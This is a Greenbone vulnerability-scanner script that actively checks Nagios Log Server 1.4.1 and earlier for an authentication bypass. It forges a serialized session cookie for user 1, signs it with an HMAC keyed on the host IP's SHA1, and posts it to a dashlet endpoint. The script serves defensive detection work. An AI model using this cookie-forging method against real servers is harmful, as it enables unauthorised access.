# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nagios:log_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107059");
  script_version("2025-04-24T05:40:00+0000");
  script_tag(name:"last_modification", value:"2025-04-24 05:40:00 +0000 (Thu, 24 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-10-12 13:26:09 +0700 (Wed, 12 Oct 2016)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Nagios Log Server < 1.4.2 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_nagios_log_server_http_detect.nasl");
  script_mandatory_keys("nagios/log_server/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Nagios Log Server is prone to multiple vulnerabilities,
  including authentication bypass, stored cross-site scripting (XSS), inconsistent authorization
  controls and privilege escalation vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"affected", value:"Nagios Log Server version 1.4.1 and prior.");

  script_tag(name:"solution", value:"Update to version 1.4.2 or later.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Aug/56");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40250");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");
include("version_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!infos = get_app_version_and_location(cpe: CPE, port: port, exit_no_version: TRUE))
  exit(0);

dir = infos["location"];
vers = infos["version"];

if (dir == "/")
  dir = "";

host = get_host_ip();
source_ip = this_host();
usr_agnt = http_get_user_agent();

session = string('a:12:{s:10:"session_id";s:32:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:10:"ip_address";s:',
                 strlen(source_ip), ':', source_ip, ';s:10:"user_agent";s:', strlen(usr_agnt), ':', usr_agnt,
                 ';s:13:"last_activity";i:1476194170;s:9:"user_data";s:0:"";s:7:"user_id";s:1:"1";s:8:',
                 '"username";s:4:"XXXX";s:5:"email";s:16:"test@example.com";s:12:"ls_logged_in";i:1;s:10:',
                 '"apisession";i:1;s:8:"language";s:7:"default";s:17:"flash:old:message";N;}');

encryption_key = SHA1(host);
hmac_check = HMAC_SHA1(data: session, key: hexstr(encryption_key));
cookie = string(session, hexstr(hmac_check));
cookie2 = urlencode(str: cookie);

url = dir + "/index.php/dashboard/dashlet";

headers = make_array("Cookie", cookie2,
                     "Content-Type", "application/x-www-form-urlencoded");

req = http_post_put_req(port: port, url: url, add_headers: headers,
                        accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && version_is_less_equal(version: vers, test_version: "1.4.1")) {
  report = http_report_vuln_url(port: port, url: url) + '\n\n';
  report += "It might be possible to bypass the authentication using the session cookie: " + cookie + '\n';
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
